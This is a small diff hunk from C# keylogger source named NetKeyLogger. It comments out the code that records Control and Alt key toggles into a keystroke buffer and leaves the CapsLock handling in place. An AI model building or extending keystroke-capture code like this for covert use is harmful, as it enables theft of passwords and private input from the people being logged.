@@ -134,7 +134,7 @@ namespace NetKeyLogger
                 {
                     //Console.WriteLine(i.ToString()); // Outputs the pressed key code [Debugging purposes]
 
-
+                    /*
                     if (ControlKey)
                     {
                         if (!tglControl)
@@ -168,7 +168,7 @@ namespace NetKeyLogger
                             keyBuffer += "<Alt=Off>";
                         }
                     }
-
+                    */
                     if (CapsLock)
                     {
                         if (!tglCapslock)
